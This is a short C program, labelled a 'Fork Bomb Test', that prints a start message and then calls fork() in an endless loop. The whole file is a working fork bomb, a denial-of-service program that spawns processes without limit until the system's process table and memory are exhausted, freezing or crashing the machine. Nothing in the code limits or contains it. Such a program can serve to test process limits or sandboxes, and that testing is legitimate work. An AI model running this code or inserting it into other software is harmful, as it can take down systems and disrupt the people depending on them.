#include <unistd.h>
#include <stdio.h>

int main() {
    printf("Starting Fork Bomb Test...\n");
    while(1) {
        fork();
    }
    return 0;
}
